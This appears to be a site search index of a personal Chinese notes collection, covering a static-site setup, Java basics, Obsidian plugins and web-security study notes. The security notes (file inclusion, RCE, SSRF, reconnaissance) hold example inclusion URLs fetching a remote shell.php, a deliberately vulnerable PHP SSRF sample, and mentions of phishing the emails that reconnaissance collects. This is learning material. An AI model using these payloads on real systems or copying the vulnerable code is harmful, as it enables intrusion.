//仓库管理员\n               id: location.href,      // Ensure uniqueness and length less than 50\n               distractionFreeMode: false  // Facebook-like distraction free mode\n           })\n   \n           gitalk.render('gitalk-container')\n       \u003c/script\u003e\n   ```\n\n   \n\n5. 等vercel拉取部署成功之后\n\n#### gittalk评论Lable问题\n\n\u003e 在我后来使用的过程中，点击除了主页笔记之外的页面，会出现评论区验证错误（Error: Validation Failed.）\n\n在此致谢：[我是东山啊](https://blog.misec.top/archives/2018810gitalk-error#:~:text=Error%3A%20Validation%20Failed%20%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E5%B0%B1%E6%AF%94%E8%BE%83%E5%A4%8D%E6%9D%82%E4%BA%86%EF%BC%8C%E9%83%A8%E5%88%86%E6%96%87%E7%AB%A0%E7%9A%84%E8%AF%84%E8%AE%BA%E5%8C%BA%E4%BC%9A%E6%8A%A5Error%3A%20Validation%20Failed%2C%E5%85%B7%E4%BD%93%E5%8E%9F%E5%9B%A0%E6%98%AF%E7%94%B1%E4%BA%8E,Github%20%E9%99%90%E5%88%B6%20labal%20%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%83%BD%E8%B6%85%E8%BF%87%2050%E5%BC%95%E8%B5%B7%E7%9A%84%EF%BC%8C%E8%AF%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%9D%A5%E8%87%AAGitalk%E9%A1%B9%E7%9B%AE%E4%BB%93%20Issues115%EF%BC%8C%E9%80%9A%E8%BF%87MD5%E5%8A%A0%E5%AF%86ID%E6%9D%A5%E7%BC%A9%E7%9F%ADlabal%E9%95%BF%E5%BA%A6%E3%80%82)的博客，已经将修改后的内容放置到了项目之中，可以直接fork进行使用\n\n# 注意事项\n\n1. 笔记仓库中的笔记都有`title`的yaml头，网站部署后的文章标题就是yaml中的title字段，所以title字段是笔记的必须\n2. 如果你已经部署好了相关的文档，那么就可以看一下这篇文章，其中包含了关于这个知识库在Obsidian中的一些格式问题，**尤其需要注意**，点击我[[Obsidian知识库笔记相关注意事项]]","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/001_JDKJREJVM%E7%9A%84%E5%85%B3%E7%B3%BB":{"title":"001_JDK、JRE、JVM的关系","content":"# 001_JDK、JRE、JVM的关系\n\n\n\nJDK：java开发工具包\nJRE：java运行环境\nJVM：java虚拟机\n软件需要JRE才能跑起来\njDK包括jRE，JVM\nJRE包括JVM\nJDK以及JRE不能跨平台，不同平台需要安装不同平台的对应包\nJava程序最终运行在**JVM**上\njava体系技术的分类\n1. JavaSE：标准版\n2. JavaEE：J企业版\n3. JavaME：微型版","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/002_%E7%9F%A5%E8%AF%86%E5%BA%93%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97":{"title":"002_知识库更新日志","content":"# 002_知识库更新日志\n\n```mermaid\njourney\ntitle 知识库更新日志\n\tsection 2022-09-30\n\t\t添加药品:5:me\n\tsection 2022-09-28\n\t\t添加影片:5:me\n\t\t添加影片模板:5:me\n\tsection 2022-09-27\n\t\t创建知识库目录看板:5:me\n\t\t整理笔记格式:5:me\n\t\t看板目录的使用:2:me\n\n```","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/002_Java%E8%BF%90%E8%A1%8C%E4%B8%8E%E5%8A%A0%E8%BD%BD":{"title":"002_Java运行与加载","content":"# 002_Java运行与加载\n\n\n\n[TOC]\n## 两个阶段：\n1. 编译 `javac *.java`\n\t\n\t1. java将源代码执行，生成JVM可以识别的字节码\n\t2. 源代码不能直接执行\n\t3. 一次编译到处运行\n2. 运行 `java 类名(不要加文件后缀名)`\n\n源代码文件：.java\n字节码文件：.class(**通过JVM的提交，可以直接被操作系统识别**)\n\n## 大致过程：\n使用Javac编译源代码.java文件，生成.class字节码文件，通过JVM将字节码进行解释为二进制文件，然后JVM将生成的二进制文件交给操作系统，操作系统与硬件进行交互。\n\n当java HelloWorld之后发生了生么\n1. 启动类加载器classloader，类加载器在硬盘上查找HelloWorld.class文件。找不到就会报错“找不到或无法加载主类”\n2. 类加载器找到对应的类文件，将类的字节码文件装载到JVM中\n3. JVM对字节码进行解释，然后将解释之后的二进制编码传给操作系统，操作系统可以直接识别执行\n## 注意事项\n\u003e注意：.class也是一种特殊的二进制文件，只是不能直接被机器识别和执行，需要通过JVM进行解释后传给操作系统才能执行。\n\n\u003ejava命令使用时，一般是在当前路径下去查找对应的类文件，但是也可以改变查找的路径，通过别的路径去进行查找类文件。\n\u003e查找类文件到别的文件查找，可以修改[[003.环境变量]]classpath，修改之后只会到那个目录进行查找，可以，但没必要。\n\u003e在有些版本的JDK中，不需要javac，可以直接使用`java 源代码文件名.java`就可以直接运行代码，并且不会生成字节码class文件，这是新的java jdk的新特性，为了简化开发流程。","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/003-Obsidian%E7%9F%A5%E8%AF%86%E5%BA%93%E7%AC%94%E8%AE%B0%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9":{"title":"003_Obsidian知识库笔记相关注意事项","content":"## 关于内容（包含title字段的yaml头）\n1. 尤其需要注意的是，在每片文章中书写一个yaml头，其中yaml头包括了`title`字段，用来标识这篇文章的标题，当然，如果没有也没有太大的问题，只是不能显示这个标题，但一般还是建议有一个\n2. 如果每次添加比较麻烦，你可以配合Obsidan中的`Templater`插件进行生成，当然，你还可以为其设置一个专属的快捷键，那会让你更“快”的。（下面放置了一个基本的Templater模板，yaml字段采用`#`号注释）\n所有字段都可以不用，但是建议保留title字段，字段名和字段值中间采用`:`隔开，**分号后面有一个空格，需要注意**\n```\n---\ncomments: false   #该字段可以不要，因为采用了gittalk的评论区，貌似已经不起作用了\ndate created: \u003c% tp.date.now() %\u003e  #采用Templater生成的文档创建时间\ndate modified: 2022-08-20          #此处我没有找到自动化的东西，是因为我觉得自动化的不如我自己手动修改\nid:                                #开源者继承下来的字段，我不知道啥作用\nlayout: page                    #布局格式，与网站的搜索方式有关\ntags: \u003c% tp.file.folder() %\u003e    #tag标签，我采用的是用父文件夹名，因为我一般都用文件夹进行归类\ntitle: \"\u003c% tp.file.title %\u003e    #文件名\"\n---\n```\n---\n## 关于文章相互之间引用\n\u003e[!faq]+ 总结\n\u003e采用`[[文章的title]]`的方式，尤其需要注意的是title中不能带有`.`（英文点符号），否则无法识别\n\n博客之前相互引用的方式为`[[]]`中间只放title名，所以尽量不要有重复的文件名，但事实上并不太可能，所以我也没有其他比较好的解决办法，值得庆幸的是，我的文件名几乎都有标识符编号，那样就不会出现重复的title名称\n\n---\n## 关于图片链接\n是在是没有搞清楚这个图片链接的形式是如何的，我看了一下源作者的博客链接 [Oldwinter](https://garden.oldwinter.top/HOMEPAGE#:~:text=%E4%B8%BB%E9%A1%B5%E5%85%B6%E5%AE%9E%E4%B9%9F%E6%98%AF%E4%B8%80/)，图片也是挂了很多。\n经过尝试，我发现了链接的可行性方案\n1. 将在知识库根文件夹下创建一个文件夹，比如我的知识库是obzsk，那么就在下面创建一个pic文件夹，然后在ob里面分别设置附件位置为这个文件夹，其次，**还需要关闭ob中的附件链接基于相对路径**![](../临时/assets/Pasted%20image%2020220918102408.png)\n2. 将所有图片上传到云端，采用图床的方式，这是通用的\n3. 采用base64引入的方式作为图片数据，经过测试，不行。\n\u003e[!faq]+ 总结\n\u003e1. 在知识库本目录下新建一个文件夹，在obsidian里面设置附件采用相对路径（基于当前文件目录），这样的话是可以使用的（因为采用这种方式，标准markdown编辑器和github也是可以识别的，而采用wiki形式，其他编辑器就无法识别了，迁移也比较麻烦）\n\u003e2. 通用方法：采用图床链接的形式，这个是万能的\n\n## 关于标准Markdown语法\n\u003e[!info] 这个知识库采用的是部分标准的markdown语法，这意味着你的换行采用两个换行符才能有换行的效果。\n\n## 关于目录的制作\n1. 插件`Quickadd` 思路是：通过每次创建笔记的时候，可以在创建笔记的时候，同时将笔记的相关链接生成放到一个markdown中，当然这个脚本我之前改过一个，但是后面弃用了，原因是兼容性比较差\n2. 通过`dataview`插件（作用是通过yaml字段生成数据表之类的视图），然后通过另一个插件进行导出，但是我忘了另一个插件的名称了\n3. 通过`kanban`看板插件，每次写笔记的时候都在看板里面写好`[[标题]]`的方式，然后双击这个标题，就可以点击进去，但是操作简单，但是整理过去的已经写好的笔记笔记麻烦","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/003_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F":{"title":"003_环境变量","content":"# 003_环境变量\n\n\n# 三种方法\n1. win+R，运行窗口中输入`sysdm.cpl`\n2. 打开资源管理，右击`此电脑`-属性-高级系统设置-高级\n3. 搜索环境变量","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/004-Yaml%E5%AD%97%E6%AE%B5%E9%85%8D%E7%BD%AE":{"title":"004-Yaml字段配置","content":"\n# Yaml字段配置\n\n\n```yaml\ncomments: false\ndate created: \u003c% tp.date.now() %\u003e\ndate modified: \u003c% tp.date.now() %\u003e\nid: \nlayout: page\ncategory: 看板\ntags: \u003c% tp.file.folder() %\u003e\ntitle: \"\u003c% tp.file.title %\u003e\"\nkanban-plugin: basic\n```","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/004_%E6%B3%A8%E9%87%8A%E6%96%B9%E6%B3%95":{"title":"004_注释方法","content":"# 004_注释方法\n\n\n1. 多行注释\n\t```java\n\t/*\n\t  注释内容\n\t*/\n\t```\n1. 单行注释\n\t```java\n \t//\n    ```\n3. 文档注释，用于javadoc生成文档\n\t```java\n\t/**\n\t* content\n\t* content\n\t*/\n\t```","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/004_Yaml%E5%AD%97%E6%AE%B5%E9%85%8D%E7%BD%AE":{"title":"004_Yaml字段配置","content":"# Yaml字段配置\n\n\n```yaml\ncomments: false\ndate created: \u003c% tp.date.now() %\u003e\ndate modified: \u003c% tp.date.now() %\u003e\nid: \nlayout: page\ncategory: 看板\ntags: \u003c% tp.file.folder() %\u003e\ntitle: \"\u003c% tp.file.title %\u003e\"\nkanban-plugin: basic\n```","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/005_%E7%9C%8B%E6%9D%BF%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%BF%E7%94%A8":{"title":"005_看板目录的使用","content":"# 005_看板目录的使用\n为了能够实现知识库的目录使用，所以使用插件的方式，去进行了目录的生成。\n## 生成\n1.  下载obsidian的看板（kanban）插件，![](../assets/Pasted%20image%2020220927134234.png \"看板视图\")，需要注意的是看板的makrodwn语法格式，除了看板的yaml头以及末尾，内容部分如图，是根据##来判断集合的\n\t```\n\t## set\n\t\n\t- [ ] [[001_部署Obsidian静态知识库网站]]\n\t- [ ] [[002_知识库更新日志]]\n\t- [ ] [[003_Obsidian知识库笔记相关注意事项]]\n\t- [ ] [[004_Yaml字段配置]]\n\t- [ ] [[005_看板目录的使用]]\n\n\t```\n\t2. 生成目录\n\t\t1. 采用java命令或者是quicker的动作，生成你需要生成的文件夹下面的目录，然后通过vscode之类的编辑工具，将额外的部分替换成标准的kanban的语法格式\n\t\t2. 新建一个看板，将目录的内容复制进去就OK了\n\t\t3. 因为如果全部目录在一个文件中，就会显得很复杂，所以我采用的还是树层结构，一是方便能够之后再创建文件的时候直接在看板视图中新建笔记，二是为了能够有更好的层次结构","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/005_public_class%E5%92%8Cclass%E7%9A%84%E5%8C%BA%E5%88%AB":{"title":"005_public_class和class的区别","content":"# 005_public_class和class的区别\n\n\n1. 一个源文件中可以定一个*多个*class类\n2. 定义public类名的时候，需要与源文件名一样\n3. public类最多只能有一个，但不是必须的\n4. 只要有一个class文件的定义，就必然会生成一个class文件\n\n![[../assets/6f303f23f7784014be89160cb2b8f3fe.png]]\n以上通过`javac`会生成三个class文件（T1 T2 T3)，需要进入哪个，就java哪个类","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/006-%E6%90%AD%E5%BB%BA%E4%B9%A6%E6%9E%B6%E6%95%99%E7%A8%8B":{"title":"006_搭建书架教程","content":"# 006_搭建书架教程\n\n# 相关\n1. [豆瓣图书](https://book.douban.com/)\n# 准备工具\n[相关工具资料](https://andlight.notion.site/obsiddian-759c542c58d64881a380850b10d1b26b)\n![](https://pic.rmb.bdstatic.com/bjh/bf36273938bc6047dae512120876cc54.jpeg)\n1. Banners\n2. Dataview\n3. QuickAdd\n\t1. Style Settings\n4. Templater\n\n# 步骤\n## 页面\n1. 建立相应文件夹，将对应的文件移到相应文件夹里\n\t1. 模板文件夹![](https://pic.rmb.bdstatic.com/bjh/55ea1b9aa60cc67c57d648c96bfdec9d.jpeg)\n\t2. 书架文件夹![image.png](https://pic.rmb.bdstatic.com/bjh/2a253a2b63eb565fba9f4f623a2b93c4.jpeg)\n2. 修改个人css，头部信息隐藏\n\t1. user.css\n\t\t```css\n\t\t/*隐藏头部*/\n\t\t.frontmatter-container {\n\t\t\tdisplay: none;\n\t\t}\n\t\t\n\t\t/*dataview用于的 */\n\t\tspan.nav {\n\t\t\tborder-top: 1px solid var(--gray-dark-3);\n\t\t\tborder-bottom: 1px solid var(--gray-dark-3);\n\t\t\tclear: right;\n\t\t\tdisplay: flex;\n\t\t\tflex-direction: row;\n\t\t\tjustify-content: space-around;\n\t\t}\n\t\t\n\t\t```\n\t\t![image.png](https://pic.rmb.bdstatic.com/bjh/4c98449002120aefc29c55b2e291c593.jpeg)\n\t\t![image.png](https://pic.rmb.bdstatic.com/bjh/398e373d8f547a58f2c6c1b8f8a9ae63.jpeg)\n3. Templater插件，设置文件夹和文件模板\n   ![image.png](https://pic.rmb.bdstatic.com/bjh/82d0c975b85368211369189b55577015.jpeg)\n   ![image.png](https://pic.rmb.bdstatic.com/bjh/7cceb546464b27937269110f68561ec9.jpeg)\n   了解占位符\u003c % tp.file.title %\u003e\n4. 启用quickAdd插件\n\t1. ![image.png](https://pic.rmb.bdstatic.com/bjh/bef3c5b5616013079c4cb92bd9471f54.jpeg)  \n\t2. ![image.png](https://pic.rmb.bdstatic.com/bjh/81c7b75278904c718302f79e03dcabf7.jpeg)\n\t3. 添加宏![image.png](https://pic.rmb.bdstatic.com/bjh/909a57a46ee4321ecfc7612d2b141588.jpeg)\n\t4. 添加一个脚本进行，豆瓣的图书查询![image.png](https://pic.rmb.bdstatic.com/bjh/a4e35319e395239e53ea67936ece4cf7.jpeg)，这个js脚本需要先放在obsidian的目录里，哪都行\n\t5. 添加一个模板![image.png](https://pic.rmb.bdstatic.com/bjh/10172f5143485dbc53a2f7de835d8836.jpeg)\n\t6. 对模板进行配置![../临时/assets/Pasted image 20220714155206.png](../临时/assets/Pasted%20image%2020220714155206.png)\n\t\t{{VALUE:bookname}}，文件名\n\t7. 添加一个动作，![image.png](https://pic.rmb.bdstatic.com/bjh/c32be7218faaf61c0105cd822b8e5727.jpeg)\n\t8. 点击闪电标识 ，添加到ctrl p里面![image.png](https://pic.rmb.bdstatic.com/bjh/de7d69c049df6be412377ffb3fce2e07.jpeg)\n\t9. 绑定快捷键![image.png](https://pic.rmb.bdstatic.com/bjh/e935b7eabf6b2bffd575d161660c9272.jpeg)\n5. 重载 ctrl 搜重载\n\n效果output\n![image.png](https://pic.rmb.bdstatic.com/bjh/fb788b9293f6be54e9b89b2523f00c2c.jpeg)\n\n---\n## dataview \n","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/006_%E6%90%AD%E5%BB%BA%E4%B9%A6%E6%9E%B6%E6%95%99%E7%A8%8B":{"title":"006_搭建书架教程","content":"# 006_搭建书架教程\n\n# 相关\n1. [豆瓣图书](https://book.douban.com/)\n# 准备工具\n[相关工具资料](https://andlight.notion.site/obsiddian-759c542c58d64881a380850b10d1b26b)\n![](https://pic.rmb.bdstatic.com/bjh/bf36273938bc6047dae512120876cc54.jpeg)\n1. Banners\n2. Dataview\n3. QuickAdd\n\t1. Style Settings\n4. Templater\n\n# 步骤\n## 页面\n1. 建立相应文件夹，将对应的文件移到相应文件夹里\n\t1. 模板文件夹![](https://pic.rmb.bdstatic.com/bjh/55ea1b9aa60cc67c57d648c96bfdec9d.jpeg)\n\t2. 书架文件夹![image.png](https://pic.rmb.bdstatic.com/bjh/2a253a2b63eb565fba9f4f623a2b93c4.jpeg)\n2. 修改个人css，头部信息隐藏\n\t1. user.css\n\t\t```css\n\t\t/*隐藏头部*/\n\t\t.frontmatter-container {\n\t\t\tdisplay: none;\n\t\t}\n\t\t\n\t\t/*dataview用于的 */\n\t\tspan.nav {\n\t\t\tborder-top: 1px solid var(--gray-dark-3);\n\t\t\tborder-bottom: 1px solid var(--gray-dark-3);\n\t\t\tclear: right;\n\t\t\tdisplay: flex;\n\t\t\tflex-direction: row;\n\t\t\tjustify-content: space-around;\n\t\t}\n\t\t\n\t\t```\n\t\t![image.png](https://pic.rmb.bdstatic.com/bjh/4c98449002120aefc29c55b2e291c593.jpeg)\n\t\t![image.png](https://pic.rmb.bdstatic.com/bjh/398e373d8f547a58f2c6c1b8f8a9ae63.jpeg)\n3. Templater插件，设置文件夹和文件模板\n   ![image.png](https://pic.rmb.bdstatic.com/bjh/82d0c975b85368211369189b55577015.jpeg)\n   ![image.png](https://pic.rmb.bdstatic.com/bjh/7cceb546464b27937269110f68561ec9.jpeg)\n   了解占位符\u003c % tp.file.title %\u003e\n4. 启用quickAdd插件\n\t1. ![image.png](https://pic.rmb.bdstatic.com/bjh/bef3c5b5616013079c4cb92bd9471f54.jpeg)  \n\t2. ![image.png](https://pic.rmb.bdstatic.com/bjh/81c7b75278904c718302f79e03dcabf7.jpeg)\n\t3. 添加宏![image.png](https://pic.rmb.bdstatic.com/bjh/909a57a46ee4321ecfc7612d2b141588.jpeg)\n\t4. 添加一个脚本进行，豆瓣的图书查询![image.png](https://pic.rmb.bdstatic.com/bjh/a4e35319e395239e53ea67936ece4cf7.jpeg)，这个js脚本需要先放在obsidian的目录里，哪都行\n\t5. 添加一个模板![image.png](https://pic.rmb.bdstatic.com/bjh/10172f5143485dbc53a2f7de835d8836.jpeg)\n\t6. 对模板进行配置![[../assets/Pasted image 20220714155206.png]]\n\t\t{{VALUE:bookname}}，文件名\n\t7. 添加一个动作，![image.png](https://pic.rmb.bdstatic.com/bjh/c32be7218faaf61c0105cd822b8e5727.jpeg)\n\t8. 点击闪电标识 ，添加到ctrl p里面![image.png](https://pic.rmb.bdstatic.com/bjh/de7d69c049df6be412377ffb3fce2e07.jpeg)\n\t9. 绑定快捷键![image.png](https://pic.rmb.bdstatic.com/bjh/e935b7eabf6b2bffd575d161660c9272.jpeg)\n5. 重载 ctrl 搜重载\n\n效果output\n![image.png](https://pic.rmb.bdstatic.com/bjh/fb788b9293f6be54e9b89b2523f00c2c.jpeg)\n\n---\n## dataview \n","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/007-obsidian%E7%9B%B8%E5%85%B3":{"title":"007_obsidian相关","content":"\n|内容|URL|\n|---|---|\n| callout | https://zhuanlan.zhihu.com/p/494647464    https://help.obsidian.md/How+to/Use+callouts|\n|[templater文档 ]|(https://silentvoid13.github.io/Templater/internal-functions/internal-modules/date-module.html)|\n| [dataview 文档]|(https://blacksmithgu.github.io/obsidian-dataview/)|\n|搜索query|https://help.obsidian.md/Plugins/Search|","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/007_obsidian%E7%9B%B8%E5%85%B3":{"title":"007_obsidian相关","content":"# 007_obsidian相关\n\n\n\n\n|内容|URL|\n|---|---|\n| callout | https://zhuanlan.zhihu.com/p/494647464    https://help.obsidian.md/How+to/Use+callouts|\n|[templater文档 ]|(https://silentvoid13.github.io/Templater/internal-functions/internal-modules/date-module.html)|\n| [dataview 文档]|(https://blacksmithgu.github.io/obsidian-dataview/)|\n|搜索query|https://help.obsidian.md/Plugins/Search|","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/009-%E5%85%B3%E4%BA%8E%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83%E7%9A%84%E6%A0%87%E8%AF%86%E7%AC%A6":{"title":"009_关于命名规范的标识符","content":"# 009_关于命名规范的标识符\n\n\n\n一个知识库的文件如何对各个文件进行命名","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/009_%E5%85%B3%E4%BA%8E%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83%E7%9A%84%E6%A0%87%E8%AF%86%E7%AC%A6":{"title":"009_关于命名规范的标识符","content":"# 009_关于命名规范的标识符\n\n\n\n一个知识库的文件如何对各个文件进行命名","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/01-%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E":{"title":"01-什么是文件包含漏洞","content":"\n\n\n\n- 别名：目录遍历漏洞/任意文件访问漏洞\n- 分类\n\t- 本地文件包含 Local File Inclusion ：LFI\n\t- 远程文件包含 Remote File Inclusion ：RFI\n- 文件包含的时候，可能指定了一个文件名；也可能指定的是一个有特殊处理方法的脚本，用于判断指向哪个具体的文件。\n- ## 本地文件包含\n- 本地文件包含： `include`在文件中明确写了包含哪个php\n- 动态包含：包含的时候通过方法进行判断包含哪个脚本 ![](https://tc3.doingnothing.online/imgs/202304111537705.png)\n- 包含恶意代码或图片马：类似于`http://localhost/fileinc/include.php?file=footer.php`在url中进行包含，可以进行指定，在 [[upload-labs]]第13关中有相关的文件包含漏洞（20关版本）\n- 包含敏感文件：`ini`以及点开头的配置文件，类似于`http://localhost/fileinc/include.php?file=C:\\Windows\\\n  system.ini`\n- ## 远程文件包含\n- | 漏洞 | 描述 | 原因 | 后果 |\n  | ---- | ---- | ---- | ---- |\n  |XXE|XML外部实体注入|使用XML传输数据，并且允许解析外部实体|导致访问敏感文件、探测端口、执行系统命令等等|\n  |SSRF|服 务 端 请 求伪造|因为使用了curl_exec()之类的函数|导致端口扫描、攻击内网主机、绕过防火墙、获取敏感信息、访问大文件造成内存溢出、操作Redis等等问题|\n  |RFI|远程文件包含|使用了include|导致任意文件访问、包含shell脚本|\n-\n- ### 配置\n- 在php中相关的文件文件\n- php.ini\n  allow_url_fopen=On\n  allow_url_include=On\n- ### 远程服务器文件\n- ```\n  http://localhost/fileinc/include.php?file=http://远程IP/1.txt\n  http://localhost/fileinc/include.php?file=http://远程IP/alert.html\n  http://localhost/fileinc/include.php?file=http://远程IP/shell.php\n  ```\n- ## 经典案例\n- CVE-2018-12613 PHPMyAdmin后台 任意文件包含漏洞\n  CVE-2020-1938 Apache Tomcat 文件包含漏洞\n  http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=file+inclusion","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/01-%E4%BB%80%E4%B9%88%E6%98%AFRCE":{"title":"01-什么是RCE","content":"\n## 基本概念\n两种含义，都是rce漏洞，一般指的是远程代码执行。\n远程代码执行：Remote Code Execute\n远程命令执行：Remote Command Execute\n\n### 为什么要远程执行代码？\n路由器、防火墙、入侵检测等设备的web管\n理界面\n自动化运维的管理系统\n### 漏洞的危害\n1. 获取服务器权限\n2. 获取敏感数据文件\n3. 写入恶意文件getshell\n4. 植入木马、勒索病毒等\n### 实际漏洞\n1.  CVE-2021-3177 Python RCE漏洞\n2. CVE-2021-21972 VMWare RCE漏洞\n3. CVE-2021-25646 Apache Druid RCE漏洞\n4. CNVD-2020-46552 深信服EDR\n5. CNVD-2021-30101 网康下一代防火墙\n6. http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=RCE\n\n## PHP RCE涉及函数\n函数\n作用\nsystem()\n执行外部程序，并且显示输出\nexec()/shell_exec() 通过 shell 环境执行命令，并且将完整的\n输出以字符串的方式返回\npcntl_exec()\n在当前进程空间执行指定程序\npassthru()\n执行外部程序并且显示原始输出\npopen()\n打开进程文件指针\nproc_open()\n执行一个命令，并且打开用来输入/输出\n的文件指针","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/01-%E4%BB%80%E4%B9%88%E6%98%AFSSRF%E6%BC%8F%E6%B4%9E":{"title":"01-什么是SSRF漏洞","content":"\n- SSRF：服务端请求伪造漏洞\n\t- 官方定义：SSRF Server-Side Request Forgery 服务器端请求伪造：是一种由攻击者构造形成==由服务端发起请求的一个安全漏洞==。\n\t- 是**通过服务器去发起请求**的\n\t- 类似于文件包含漏洞通过服务器去访问内网的资源，\n\t- 更类似于java中的接口，之前qq暴露了内部设置的一个api接口，可以通过这个api接口访问到qq的密保绑定手机号码以及一些个人信息等等，导致了qq泄露了十几亿的个人用户身份、电话等信息\n- ## 危害\n- 1、扫描资产\n  2、获取敏感信息\n  3、攻击内网服务器（绕过防火墙）（因为是通过内网服务器发起请求的，无序攻击者绕过防火墙）\n  4、访问大文件，造成溢出\n  5、通过Redis写入WebShell或建立反弹连接\n- ## 发现：通常出现的地方\n- 社会化分享功能，网页上有一个分享到qq、朋友圈等等的对话框弹窗，因为需要采集网页信息，可能会出现ssrf漏洞\n- 转码服务，同上也是需要采集当前网页信息\n- 在线翻译，比如网页翻译，需要输入你需要翻译的网页，通过服务端请求第三方网站获取资源\n- 图片下载、加载功能，有的头像、图片等等不需要你从本地上传，而是输入网址，它去通过服务端帮你请求这个图片资源\n- 图片、文章收藏功能\n- 网站采集、抓取\n- ## 实际案例 #了解\n- 1、Wordpress 3.5.1以下版本 xmlrpc.php\n  pingback的缺陷与SSFR\n  2、discuz!的SSRF（利用php的header函数来\n  绕过，其实就是302跳转实现协议转换）\n  3、weblogic的SSRF\n- ## 案例\n- 部署在phpstudy中，一下代码的作用是\n\t- 使用curl方法来访问资源等等，类似于linux与cmd中的curl方法  ![image.png](../../assets/image_1681793479292_0.png)\n- id:: 643e2117-c257-4ffb-8fc4-d3f7097b12b2\n  ```\n  \u003c?php\n  function curl($url){  \n      $ch = curl_init();\n      // 设置URL和相应的选项\n      curl_setopt($ch, CURLOPT_URL, $url);\n      curl_setopt($ch, CURLOPT_HEADER, 0); // 启用时会将头文件的信息作为数据流输出  \n      // 抓取URL并把它传递给浏览器  \n      curl_exec($ch);\n      //关闭cURL资源，并且释放系统资源  \n      curl_close($ch);\n  }\n  \n  $url = $_GET['url'];\n  curl($url);  \n  ?\u003e\n  ```\n- 在url中传递参数`[百度一下，你就知道](http://ssrf:8087/index.php?url=www.baidu.com)`\n- 然后服务器通过这个函数访问百度网站，并将访问到的百度的网站资源转发给我们显示 ![image.png](../../assets/image_1681793573843_0.png)\n- ## php curl扩展\n- 获取网页资源——爬虫\n  webservice——获取接口数据\n  FTP——下载文件\n- 默认配置已经配置好了，如果没有打开，对应的配置在php.ini的`extension=php_curl.dll`\n- ## PHP其他函数\n- `curl_exec()`    执行 cURL 会话\n  `file_get_contents()`    将整个文件读入一个字符串\n  `fsockopen()`      打开一个网络连接或者一个Unix套\n  接字连接\n- 这三个常见的函数都可能引起ssrf漏洞\n- ## CURL其他协议\n- ![image.png](../../assets/image_1681794084601_0.png){:height 280, :width 624}\n- dict协议：用于搭建在线字典服务，就是我们查的那个英语汉语词典字典，不是特殊的词典字典\n- gopher协议：古老的东西，是一种信息查找系统，只支持文\n  本，不支持图像，已被HTTP替代\n- ## 靶场\n- [[pikachu]]","lastmodified":"2023-05-31T09:03:32.945906909Z","tags":null},"/01-%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86":{"title":"01-域名信息收集","content":"\n\n- ## 域名\n- 与域名相关的信息\n- 所属人邮箱电话地址\n- 如何查询：whois\n- ### 域名\n- 与域名相关的信息\n\t- 所属人\n\t- 邮箱\n\t- 电话\n- 地址 com域名由verisign管理，cn域名由cnnic管理\n-\n- whois工具\n- [https://whois.chinaz.com](https://whois.chinaz.com/)\n- [http://whoissoft.com](http://whoissoft.com/)\n- [https://whois.cnnic.cn/](https://whois.cnnic.cn/WelcomeServlet)[WelcomeServlet](https://wiki.doingnothing.online/#WelcomeServlet)\n- whois命令（kali）\n  \n  域名反查 [http://whois.chinaz.com/reverse](http://whois.chinaz.com/reverse)\n- whois.chinaz\n- [coolshell.cn 域名WHOIS查询](http://whoissoft.com/)[WhoisSoft](https://wiki.doingnothing.online/#WhoisSoft)\n- [whois (cnnic.cn)](https://webwhois.cnnic.cn/WelcomeServlet) 国家域名查询，垃圾网站，用不了\n- kali `whois`命令\n- 通过备案信息查询（针对与国内的）[ICP/IP地址/域名信息备案管理系统 (miit.gov.cn)](https://beian.miit.gov.cn/#/Integrated/index)\n## 查看他公开的联系信息：\n\n公司的：天眼查，公司官网\n\n这些信息的作用：\n- 邮箱：可以投放垃圾钓鱼邮件\n- 姓名等等：可以通过社工，来猜低密码\n- 反查：查到更多的域名或者信息，一些网站主站的安全性过高，可以通过渗透附网站来获取更多的信息，从而来对主网站进行渗透\n### 子域名信息收集\n\n怎么查：\n- 枚举\n- 字典猜\n- 子域名信息收集工具\n- layer子域名挖掘机纪念版 [Layer子域名挖掘机4.2纪念版 增加功能 –](https://www.webshell.cc/6384.html)[WebShell](https://wiki.doingnothing.online/#WebShell)'S Blog\n- [subDomainsBrute](https://github.com/lijiejie/subDomainsBrute) 需要python环境\n- ### 域名解析收集\n  \n  常用的五种dns解析 A ：A记录是最常用类型，将域名指向一个Pv4地址，如8.8.8.8 CNAME：将域名指向另一个域名地址，与其保持相同解析，如htps/ww.dnspod.cn MX：用于邮件服务器，相关参数一般由邮件注册商提供 TXT：可填写附文本信息，常用于域名验证 NS：域名服务器记录，可将指定域名交由其他DNS服务商解析管理 AAAA：将域名指向一个IPv6地址，如ff06:0:0:00:00:c3\n  \n  